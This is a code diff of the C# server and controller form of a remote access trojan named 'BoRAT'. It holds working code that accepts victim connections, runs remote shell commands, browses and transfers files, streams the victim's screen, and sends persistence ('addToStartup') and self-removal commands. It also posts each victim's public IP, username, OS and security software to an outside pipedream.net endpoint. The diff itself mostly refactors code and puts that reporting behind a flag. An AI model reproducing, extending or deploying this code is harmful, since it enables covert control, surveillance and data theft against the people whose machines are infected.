@@ -16,101 +16,37 @@ namespace BoRAT.Server
 {
     public partial class frmMain : Form
     {
-        private frmRdp fullScreenRdp;
+        // Change this
+        private bool pipedreamEnabled = false;
+        private string pipedreamURL = "https://eonvuonqbllwqpu.m.pipedream.net";
+        private string encryptionKey = "B0R@t2!02@2^2%2#";
+
+        // Networking
         private int port { get; set; }
         private int bufferSize { get; set; }
-        private int writeSize;
-        private int fdlSize;
-        private string dirPath { get; set; }
-        private string fdl_location { get; set; }
-        private string fup_location { get; set; }
-        private string noIP { get; set; }
-        private string iconPath { get; set; }
-        private string sTIconPath { get; set; }
-        private bool isFileDownload { get; set; }
-        private bool isImage { get; set; }
-        private bool fullScreen { get; set; }
         private Socket serverSocket { get; set; }
         private Socket targetClient { get; set; }
         private readonly List<Socket> listSockets = new List<Socket>();
         private byte[] buffer { get; set; }
+
+        // File Manager
+        private string dirPath { get; set; }
+        private string fdl_location { get; set; }
+        private string fup_location { get; set; }
+        private bool isFileDownload { get; set; }
+
         private byte[] receiveFile = new byte[1];
-        public const int WM_NCLBUTTONDOWN = 0xA1;
-        public const int HT_CAPTION = 0x2;
+        private int writeSize;
+        private int fdlSize;
 
-        [DllImportAttribute("user32.dll")]
-        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
-
-        [DllImportAttribute("user32.dll")]
-        public static extern bool ReleaseCapture();
+        // Remote Desktop
+        private bool isImage { get; set; }
+        private bool fullScreen { get; set; }
+        private frmRdp fullScreenRdp;
 
         public frmMain()
         {
             InitializeComponent();
-            colorListViewHeader(ref listClients, listClients.BackColor, listClients.ForeColor);
-            colorListViewHeader(ref listFileManager, listClients.BackColor, listClients.ForeColor);
-        }
-
-        public static void colorListViewHeader(ref ListView list, Color backColor, Color foreColor)
-        {
-            list.OwnerDraw = true;
-            list.DrawColumnHeader +=
-                (sender, e) => headerDraw(sender, e, backColor, foreColor);
-            list.DrawItem += bodyDraw;
-        }
-
-        private static void headerDraw(object sender, DrawListViewColumnHeaderEventArgs e, Color backColor,
-            Color foreColor)
-        {
-            e.Graphics.FillRectangle(new SolidBrush(backColor), e.Bounds);
-            e.Graphics.DrawString(e.Header.Text, e.Font, new SolidBrush(foreColor), e.Bounds);
-        }
-
-        private static void bodyDraw(object sender, DrawListViewItemEventArgs e)
-        {
-            e.DrawDefault = true;
-        }
-
-        private void PanelBar_MouseDown(object sender, MouseEventArgs e)
-        {
-            ReleaseCapture();
-            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
-        }
-
-        private void lblVersion_MouseDown(object sender, MouseEventArgs e)
-        {
-            ReleaseCapture();
-            SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
-        }
-
-        private void btnClients_Click(object sender, EventArgs e)
-        {
-            setPanel(PanelClients);
-        }
-
-        private void btnCommand_Click(object sender, EventArgs e)
-        {
-            setPanel(PanelCommand);
-        }
-
-        private void btnFileManager_Click(object sender, EventArgs e)
-        {
-            setPanel(PanelFileManager);
-        }
-
-        private void btnRdp_Click(object sender, EventArgs e)
-        {
-            setPanel(PanelRdp);
-        }
-
-
-        private void setPanel(object sender)
-        {
-            /* PanelClients.Visible = false;
-            PanelCommand.Visible = false;
-            PanelFileManager.Visible = false;
-            PanelRdp.Visible = false;
-            ((Panel)sender).Visible = true; */
         }
 
         private void btnListen_Click(object sender, EventArgs e)
@@ -121,7 +57,7 @@ namespace BoRAT.Server
             }
             catch (ArgumentOutOfRangeException)
             {
-                MessageBox.Show("Bad Value");
+                MessageBox.Show("Value is too big!", "BoRAT");
                 return;
             }
 
@@ -132,10 +68,12 @@ namespace BoRAT.Server
 
                 serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 var ipEndPoint = new IPEndPoint(IPAddress.Any, port);
+
                 serverSocket.Bind(ipEndPoint);
                 serverSocket.Listen(50);
-                serverSocket.BeginAccept(AcceptcallBack, serverSocket);
-                updateStatus();
+                serverSocket.BeginAccept(AcceptCallback, serverSocket);
+
+                UpdateStatus();
             }
             catch (SocketException msg)
             {
@@ -143,7 +81,7 @@ namespace BoRAT.Server
             }
         }
 
-        private void AcceptcallBack(IAsyncResult ar)
+        private void AcceptCallback(IAsyncResult ar)
         {
             Socket connection;
             try
@@ -158,13 +96,13 @@ namespace BoRAT.Server
 
             listSockets.Add(connection);
             var id = listSockets.Count;
-            addClientID(id);
-            updateStatus();
+            AddClientID(id);
+            UpdateStatus();
             var command = string.Format("getInfo~{0}", id);
-            sendCommand(command, id);
+            SendCommand(command, id);
             //create info & command
             connection.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, connection);
-            serverSocket.BeginAccept(AcceptcallBack, null);
+            serverSocket.BeginAccept(AcceptCallback, null);
         }
 
         private void ReceivecallBack(IAsyncResult ar)
@@ -186,15 +124,15 @@ namespace BoRAT.Server
             Array.Copy(buffer, receivedBuffer, recevied);
             //check info
             if (isImage)
-                processImage(receivedBuffer);
+                ProcessImage(receivedBuffer);
             if (isFileDownload)
-                processDUInfo(receivedBuffer);
+                ProcessDUInfo(receivedBuffer);
             else if (!isFileDownload)
-                processNormalInfo(receivedBuffer);
+                ProcessNormalInfo(receivedBuffer);
             currentSocket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, currentSocket);
         }
 
-        private void processImage(byte[] data)
+        private void ProcessImage(byte[] data)
         {
             var header = Encoding.Unicode.GetString(data, 0, 16);
             if (header.Equals("rdpImage"))
@@ -204,7 +142,7 @@ namespace BoRAT.Server
                     {
                         ms.Write(data, 16, data.Length - 16);
                         var image = (Bitmap)Image.FromStream(ms);
-                        addImage(image);
+                        AddImage(image);
                         Array.Clear(data, 0, data.Length);
                     }
 
@@ -216,27 +154,26 @@ namespace BoRAT.Server
                 }
         }
 
-        private void processNormalInfo(byte[] receivedBuffer, string command = "")
+        private void ProcessNormalInfo(byte[] receivedBuffer, string command = "")
         {
             command = Encoding.Unicode.GetString(receivedBuffer);
             command = Decrypt(command);
 
-            if (command.Equals("pwned")) MessageBox.Show("YOU WERE PWNED!!!");
             if (command.StartsWith("infoBack"))
             {
                 var info = command.Split('|');
-                addClientInfo(info[1]);
+                AddClientInfo(info[1]);
             }
 
             else if (command.StartsWith("commandout§"))
             {
                 var results = command.Split('§')[1];
-                updateUI(() => Logs.Text += results);
+                UpdateUI(() => Logs.Text += results);
             }
 
             else if (command.StartsWith("drivesList~"))
             {
-                updateUI(() => listFileManager.Items.Clear());
+                UpdateUI(() => listFileManager.Items.Clear());
 
                 var drives = command.Split('~')[1];
                 var drivesList = drives.Split('\n');
@@ -248,13 +185,13 @@ namespace BoRAT.Server
                     var name = driverInfo.Split('|')[0];
                     var size = driverInfo.Split('|')[1];
 
-                    addFileManagerInfo(name, size, "N/A", name);
+                    AddFileManagerInfo(name, size, "N/A", name);
                 }
             }
 
             else if (command.StartsWith("enterPath~"))
             {
-                updateUI(() => listFileManager.Items.Clear());
+                UpdateUI(() => listFileManager.Items.Clear());
                 var info = command.Split('~')[1];
                 var directories = info.Split('\n');
 
@@ -267,7 +204,7 @@ namespace BoRAT.Server
                     var creationTime = s.Split('|')[2];
                     var path = s.Split('|')[3];
 
-                    addFileManagerInfo(name, size, creationTime, path);
+                    AddFileManagerInfo(name, size, creationTime, path);
                 }
             }
 
@@ -277,13 +214,12 @@ namespace BoRAT.Server
 
                 if (info.Equals("driveList"))
                 {
-                    updateUI(() => drivesListToolStripMenuItem.PerformClick());
+                    UpdateUI(() => drivesListToolStripMenuItem.PerformClick());
                 }
-
                 else
                 {
                     dirPath = info;
-                    sendCommandToTarget("enterPath~" + info);
+                    SendCommandToTarget("enterPath~" + info);
                 }
             }
 
@@ -293,33 +229,39 @@ namespace BoRAT.Server
                 fdlSize = size;
                 receiveFile = new byte[fdlSize];
                 isFileDownload = true;
-                sendCommandToTarget("fdlConfirm");
+                SendCommandToTarget("fdlConfirm");
             }
 
             else if (command.Equals("fupConfirm"))
             {
-                updateUI(() => LogsFileManager.Text += "Upload Request Accepted.\n" +
+                UpdateUI(() => LogsFileManager.Text += "Upload Request Accepted.\n" +
                                                        "Uploading " + Path.GetFileName(fup_location) + " To " +
                                                        dirPath + "\n");
                 var dataToSend = File.ReadAllBytes(fup_location);
-                sendFileToTarget(dataToSend);
+                SendFileToTarget(dataToSend);
             }
 
             else if (command.Equals("fileReceived"))
             {
-                updateUI(() => LogsFileManager.Text += "Uploaded.\n");
+                UpdateUI(() => LogsFileManager.Text += "Uploaded.\n");
             }
 
             else if (command.StartsWith("error~"))
             {
                 processErrors(command.Split('~')[1]);
             }
+
+            else if (command.StartsWith(""))
+            {
+                UpdateUI(() =>
+                    rtbLog.Text += "\n[" + DateTime.Now.ToString("h:mm:ss tt") + "] " + command + Environment.NewLine);
+            }
         }
 
-        private void processDUInfo(byte[] buffer)
+        private void ProcessDUInfo(byte[] buffer)
         {
-            updateUI(() => LogsFileManager.Text += "Download Request Accepted.\n");
-            updateUI(() => LogsFileManager.Text += "Downloading \"" + Path.GetFileName(fdl_location) + "\"" + "\n");
+            UpdateUI(() => LogsFileManager.Text += "Download Request Accepted.\n");
+            UpdateUI(() => LogsFileManager.Text += "Downloading \"" + Path.GetFileName(fdl_location) + "\"" + "\n");
             writeSize = 0;
             Buffer.BlockCopy(buffer, 0, receiveFile, writeSize, buffer.Length);
             writeSize += buffer.Length;
@@ -333,100 +275,116 @@ namespace BoRAT.Server
 
             //File.WriteAllBytes(fdl_location, buffer);
             Array.Clear(receiveFile, 0, receiveFile.Length);
-            updateUI(() => LogsFileManager.Text += Path.GetFileName(fdl_location) + " Downloaded.\n");
+            UpdateUI(() => LogsFileManager.Text += Path.GetFileName(fdl_location) + " Downloaded.\n");
             isFileDownload = false;
         }
 
         private void processErrors(string errorText)
         {
-            if (errorText.Contains("commandFaild"))
+            if (errorText.Contains("commandFailed"))
             {
-                MessageBox.Show("Start Command Before Use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Start command before use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
 
             if (errorText.Contains("Directory") || errorText.Contains("File") ||
                 errorText.Contains("EnterPath") || errorText.Contains("Access"))
-                updateUI(() => LogsFileManager.Text += errorText);
+                UpdateUI(() => LogsFileManager.Text += errorText);
         }
 
-        private void sendCommand(string command, int id)
+        private void SendCommand(string command, int id)
         {
             var socket = listSockets[id - 1];
             var data = Encoding.Unicode.GetBytes(command);
+
             socket.Send(data);
         }
 
-        private void sendCommandToTarget(string command)
+        private void SendCommandToTarget(string command)
         {
+            // If the client isn't null.
             if (targetClient != null)
             {
+                // Encrypt the command.
                 command = Encrypt(command);
+                // Get the bytes of the command.
                 var dataToSend = Encoding.Unicode.GetBytes(command);
+
+                // Send to the client.
                 targetClient.Send(dataToSend);
             }
-
             else
             {
-                MessageBox.Show("Select Your Target!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                // Display a message to the user saying to select a target.
+                MessageBox.Show("Select your target!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
-        private void sendFileToTarget(byte[] data)
+        private void SendFileToTarget(byte[] data)
         {
             try
             {
+                // Send the file to the client.
                 targetClient.Send(data);
             }
             catch (Exception ex)
             {
-                updateUI(() => LogsFileManager.Text += ex.Message + "\n");
+                // Update the file manager logs.
+                UpdateUI(() => LogsFileManager.Text += ex.Message + "\n");
             }
         }
 
-        private void addImage(Bitmap image)
+        private void AddImage(Bitmap image)
         {
+            // If the RDP isn't full screen.
             if (!fullScreen)
-                updateUI(() => pBRdp.Image = image);
+                // Update the image.
+                UpdateUI(() => pBRdp.Image = image);
             else
+                // Add the image to the RDP form.
                 fullScreenRdp.image = image;
-            //fullScreenRdp.Show();
         }
 
-        private void addClientID(int id)
+        private void AddClientID(int id)
         {
-            updateUI(() => listClients.Items.Add(id.ToString()));
+            UpdateUI(() => listClients.Items.Add(id.ToString()));
         }
 
-        private void addClientInfo(string info)
+        private void AddClientInfo(string info)
         {
             var data = info.Split('~');
             var id = int.Parse(data[0]);
             var client = new ListViewItem();
-            updateUI(() => client = listClients.Items[id - 1]);
-            updateUI(() => client.SubItems.Add(data[1]));
-            updateUI(() => client.SubItems.Add(data[2]));
-            updateUI(() => client.SubItems.Add(data[3]));
-            updateUI(() => client.SubItems.Add(data[4]));
-            updateUI(() => client.SubItems.Add(data[5]));
 
-            var endPoint = @"https://eonvuonqbllwqpu.m.pipedream.net";
+            UpdateUI(() => client = listClients.Items[id - 1]);
+            UpdateUI(() => client.SubItems.Add(data[1]));
+            UpdateUI(() => client.SubItems.Add(data[2]));
+            UpdateUI(() => client.SubItems.Add(data[3]));
+            UpdateUI(() => client.SubItems.Add(data[4]));
+            UpdateUI(() => client.SubItems.Add(data[5]));
 
-            var discord_client = new HttpClient();
-
-            var discord_data = new[]
+            // Detect if pipedream is enabled.
+            if (pipedreamEnabled == true)
             {
-                new KeyValuePair<string, string>("pubip", data[1]),
-                new KeyValuePair<string, string>("username", data[2]),
-                new KeyValuePair<string, string>("os", data[3]),
-                new KeyValuePair<string, string>("security", data[4]),
-                new KeyValuePair<string, string>("datetime", data[5])
-            };
+                // Create a new http client for pipedream.
+                var pipedreamClient = new HttpClient();
 
-            discord_client.PostAsync(endPoint, new FormUrlEncodedContent(discord_data)).GetAwaiter().GetResult();
+                // Bind the data to the request.
+                var pipedreamData = new[]
+                {
+                    new KeyValuePair<string, string>("pubip", data[1]),
+                    new KeyValuePair<string, string>("username", data[2]),
+                    new KeyValuePair<string, string>("os", data[3]),
+                    new KeyValuePair<string, string>("security", data[4]),
+                    new KeyValuePair<string, string>("datetime", data[5])
+                };
+
+                // Send a post request to the pipedream endpoint with the data.
+                pipedreamClient.PostAsync(pipedreamURL, new FormUrlEncodedContent(pipedreamData)).GetAwaiter().GetResult();
+            }
         }
 
-        private void addFileManagerInfo(string name, string size, string creationTime, string path)
+        private void AddFileManagerInfo(string name, string size, string creationTime, string path)
         {
             if (!size.Equals("N/A"))
                 size = FormatBytes(long.Parse(size));
@@ -436,11 +394,11 @@ namespace BoRAT.Server
             lvi.SubItems.Add(creationTime);
             lvi.SubItems.Add(path);
 
-            updateUI(() => listFileManager.Items.Add(lvi));
-            updateUI(() => listFileManager.Items[0].Selected = true);
+            UpdateUI(() => listFileManager.Items.Add(lvi));
+            UpdateUI(() => listFileManager.Items[0].Selected = true);
         }
 
-        //stackoverflow.com/questions/1242266/converting-bytes-to-gb-in-c
+        // SOURCE : https://stackoverflow.com/questions/1242266/converting-bytes-to-gb-in-c
         private static string FormatBytes(long bytes)
         {
             string[] Suffix = { "B", "KB", "MB", "GB", "TB" };
@@ -451,18 +409,19 @@ namespace BoRAT.Server
             return string.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
         }
 
-        private void updateStatus(string text = "n")
+        private void UpdateStatus(string text = "n")
         {
             if (text.Equals("n"))
-                updateUI(() => lblStatus.Text =
+                UpdateUI(() => lblStatus.Text =
                     string.Format("Status: Listening on port {0} | Connections: {1}", port, listClients.Items.Count));
             else
-                updateUI(() => lblStatus.Text =
+                UpdateUI(() => lblStatus.Text =
                     string.Format(text));
         }
 
-        private void updateUI(Action action)
+        private void UpdateUI(Action action)
         {
+            // Invoke the action parameter.
             Invoke(new Action(action), null);
         }
 
@@ -485,13 +444,13 @@ namespace BoRAT.Server
                 var connection = item.SubItems[1].Text;
                 var statusText = string.Format("Status: Listening on port {0} | Connections: {1} | Target: {2}", port,
                     listClients.Items.Count, username);
-                updateStatus(statusText);
+                UpdateStatus(statusText);
 
-                updateUI(() =>
+                UpdateUI(() =>
                     lblStatusCommandShell.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
-                updateUI(() =>
+                UpdateUI(() =>
                     lblStatusFileManager.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
-                updateUI(
+                UpdateUI(
                     () => lblStatusRdp.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
             }
         }
@@ -501,8 +460,8 @@ namespace BoRAT.Server
             if (e.KeyCode == Keys.Return)
             {
                 var info = "command§" + txtCommand.Text;
-                //targetClient.Send(Encoding.Unicode.GetBytes(info));
-                sendCommandToTarget(info);
+                
+                SendCommandToTarget(info);
                 txtCommand.Text = "";
             }
 
@@ -514,18 +473,15 @@ namespace BoRAT.Server
 
         private void runCommandShellToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            //byte[] data = Encoding.Unicode.GetBytes("startCommand");
-            //targetClient.Send(data);
-            sendCommandToTarget("startCommand");
+            SendCommandToTarget("startCommand");
         }
 
         public string Encrypt(string clearText)
         {
-            var EncryptionKey = "BoRAT_2022";
             var clearBytes = Encoding.Unicode.GetBytes(clearText);
             using (var encryptor = Rijndael.Create())
             {
-                var pdb = new Rfc2898DeriveBytes(EncryptionKey,
+                var pdb = new Rfc2898DeriveBytes(encryptionKey,
                     new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                 encryptor.Key = pdb.GetBytes(32);
                 encryptor.IV = pdb.GetBytes(16);
@@ -549,11 +505,10 @@ namespace BoRAT.Server
         {
             try
             {
-                var EncryptionKey = "BoRAT_2022";
                 var cipherBytes = Convert.FromBase64String(cipherText);
                 using (var encryptor = Rijndael.Create())
                 {
-                    var pdb = new Rfc2898DeriveBytes(EncryptionKey,
+                    var pdb = new Rfc2898DeriveBytes(encryptionKey,
                         new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                     encryptor.Key = pdb.GetBytes(32);
                     encryptor.IV = pdb.GetBytes(16);
@@ -602,8 +557,8 @@ namespace BoRAT.Server
 
         private void drivesListToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            dirPath = "dirvesList";
-            sendCommandToTarget("drivesList");
+            dirPath = "drivesList";
+            SendCommandToTarget("drivesList");
         }
 
         private void enterToolStripMenuItem_Click(object sender, EventArgs e)
@@ -612,27 +567,27 @@ namespace BoRAT.Server
             {
                 var pathToEnter = listFileManager.SelectedItems[0].SubItems[3].Text;
                 dirPath = pathToEnter;
-                sendCommandToTarget("enterPath~" + pathToEnter);
+                SendCommandToTarget("enterPath~" + pathToEnter);
             }
         }
 
         private void backToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (dirPath.Equals("dirvesList"))
+            if (dirPath.Equals("drivesList"))
                 return;
-            sendCommandToTarget("backPath~" + dirPath);
+            SendCommandToTarget("backPath~" + dirPath);
         }
 
         private void Logs_TextChanged(object sender, EventArgs e)
         {
-            updateUI(() => Logs.SelectionStart = Logs.Text.Length);
-            updateUI(() => Logs.ScrollToCaret());
+            UpdateUI(() => Logs.SelectionStart = Logs.Text.Length);
+            UpdateUI(() => Logs.ScrollToCaret());
         }
 
         private void LogsFileManager_TextChanged(object sender, EventArgs e)
         {
-            updateUI(() => LogsFileManager.SelectionStart = LogsFileManager.Text.Length);
-            updateUI(() => LogsFileManager.ScrollToCaret());
+            UpdateUI(() => LogsFileManager.SelectionStart = LogsFileManager.Text.Length);
+            UpdateUI(() => LogsFileManager.ScrollToCaret());
         }
 
         private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
@@ -641,7 +596,7 @@ namespace BoRAT.Server
             {
                 if (listFileManager.SelectedItems[0].SubItems[1].Text.Equals("Directory"))
                 {
-                    updateUI(() => LogsFileManager.Text += "Cannot Download a Directory!+\n");
+                    UpdateUI(() => LogsFileManager.Text += "Cannot Download a Directory!+\n");
                     return;
                 }
 
@@ -649,9 +604,9 @@ namespace BoRAT.Server
                     Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads");
 
                 var filename = listFileManager.SelectedItems[0].SubItems[3].Text;
-                updateUI(() => LogsFileManager.Text += "Sending Download Request ...\n");
+                UpdateUI(() => LogsFileManager.Text += "Sending Download Request ...\n");
                 fdl_location = "ratDownloads\\" + Path.GetFileName(filename);
-                sendCommandToTarget("fdl~" + filename);
+                SendCommandToTarget("fdl~" + filename);
             }
         }
 
@@ -668,7 +623,7 @@ namespace BoRAT.Server
             info += "\\" + fileName + "~" + new FileInfo(fup_location).Length;
 
             LogsFileManager.Text += "Sending Upload Request ...";
-            sendCommandToTarget("fup~" + info);
+            SendCommandToTarget("fup~" + info);
         }
 
         private void btnStartRdp_Click(object sender, EventArgs e)
@@ -676,19 +631,19 @@ namespace BoRAT.Server
             fullScreenRdp = new frmRdp();
             fullScreen = false;
             isImage = true;
-            sendCommandToTarget("rdpStart");
+            SendCommandToTarget("rdpStart");
         }
 
         private void btnRdpStop_Click(object sender, EventArgs e)
         {
             isImage = false;
             if (pBRdp.Image != null)
-                updateUI(() => pBRdp.Image.Dispose());
-            updateUI(() => pBRdp.Image = null);
-            updateUI(() => comboRdp.SelectedIndex = 0);
+                UpdateUI(() => pBRdp.Image.Dispose());
+            UpdateUI(() => pBRdp.Image = null);
+            UpdateUI(() => comboRdp.SelectedIndex = 0);
             if (fullScreenRdp != null)
                 fullScreenRdp.Close();
-            sendCommandToTarget("rdpStop");
+            SendCommandToTarget("rdpStop");
         }
 
         private void comboRdp_SelectedIndexChanged(object sender, EventArgs e)
@@ -704,15 +659,15 @@ namespace BoRAT.Server
 
                 case 0:
                     fullScreen = false;
-                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
+                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                     break;
                 case 1:
                     fullScreen = false;
-                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.CenterImage);
+                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.CenterImage);
                     break;
                 case 2:
                     fullScreen = false;
-                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.AutoSize);
+                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.AutoSize);
                     break;
                 case 3:
                     fullScreen = true;
@@ -720,18 +675,24 @@ namespace BoRAT.Server
                     break;
                 default:
                     fullScreen = false;
-                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
+                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                     break;
             }
         }
 
-        private void bunifuCustomLabel2_Click(object sender, EventArgs e)
-        {
-            Close();
-        }
 
         private void frmMain_Load(object sender, EventArgs e)
         {
+        }
+
+        private void btnSuicide_Click(object sender, EventArgs e)
+        {
+            SendCommandToTarget("suicide");
+        }
+
+        private void btnAddToStartup_Click(object sender, EventArgs e)
+        {
+            SendCommandToTarget("addToStartup");
         }
     }
 }
